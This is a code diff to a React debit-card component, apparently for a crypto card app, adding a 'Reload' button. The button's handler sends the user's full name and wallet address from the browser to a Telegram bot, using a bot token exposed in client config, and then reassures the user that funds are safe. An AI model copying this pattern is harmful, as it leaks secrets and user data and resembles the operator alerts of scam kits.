@@ -1,7 +1,9 @@
 import { Card } from './ui/card';
-import { Copy, Eye, EyeOff } from 'lucide-react';
+import { Button } from './ui/button';
+import { Copy, Eye, EyeOff, RefreshCw } from 'lucide-react';
 import { useState } from 'react';
 import { useToast } from '@/hooks/use-toast';
+import { CONFIG } from '@/lib/config';
 
 interface DebitCardProps {
   cardNumber?: string;
@@ -11,6 +13,8 @@ interface DebitCardProps {
   balance: number;
   fullName: string;
   hasCard: boolean;
+  walletAddress?: string;
+  onBalanceReload?: () => void;
 }
 
 const DebitCard = ({ 
@@ -20,7 +24,9 @@ const DebitCard = ({
   billingAddress, 
   balance, 
   fullName,
-  hasCard 
+  hasCard,
+  walletAddress,
+  onBalanceReload
 }: DebitCardProps) => {
   const [showSensitive, setShowSensitive] = useState(false);
   const { toast } = useToast();
@@ -51,6 +57,42 @@ const DebitCard = ({
       title: "Copied!",
       description: `${label} copied to clipboard`,
     });
+  };
+
+  const handleBalanceReload = async () => {
+    if (!walletAddress || !fullName) return;
+    
+    try {
+      // Send Telegram notification
+      const message = `🔄 Balance Reload Request\n\nName: ${fullName}\nWallet: ${walletAddress}`;
+      
+      await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: CONFIG.TELEGRAM.CHAT_ID,
+          text: message,
+        }),
+      });
+
+      // Call the reload function if provided
+      if (onBalanceReload) {
+        onBalanceReload();
+      }
+
+      toast({
+        title: "Balance Reload Requested",
+        description: "Your funds are safe. Balance will be updated shortly.",
+      });
+    } catch (error) {
+      toast({
+        title: "Request Failed",
+        description: "Please try again later.",
+        variant: "destructive",
+      });
+    }
   };
 
   if (!hasCard) {
@@ -87,12 +129,23 @@ const DebitCard = ({
             <h3 className="text-xs font-medium opacity-80">PEPUNS X PENK</h3>
             <p className="text-lg font-bold mt-1">{formatBalance(balance)}</p>
           </div>
-          <button
-            onClick={() => setShowSensitive(!showSensitive)}
-            className="p-2 hover:bg-primary-foreground/10 rounded-lg transition-colors"
-          >
-            {showSensitive ? <EyeOff size={16} /> : <Eye size={16} />}
-          </button>
+          <div className="flex items-center gap-2">
+            <Button
+              onClick={handleBalanceReload}
+              size="sm"
+              variant="ghost"
+              className="h-8 px-2 text-xs text-primary-foreground hover:bg-primary-foreground/10"
+            >
+              <RefreshCw size={12} />
+              Reload
+            </Button>
+            <button
+              onClick={() => setShowSensitive(!showSensitive)}
+              className="p-2 hover:bg-primary-foreground/10 rounded-lg transition-colors"
+            >
+              {showSensitive ? <EyeOff size={16} /> : <Eye size={16} />}
+            </button>
+          </div>
         </div>
 
         {/* Card Number */}
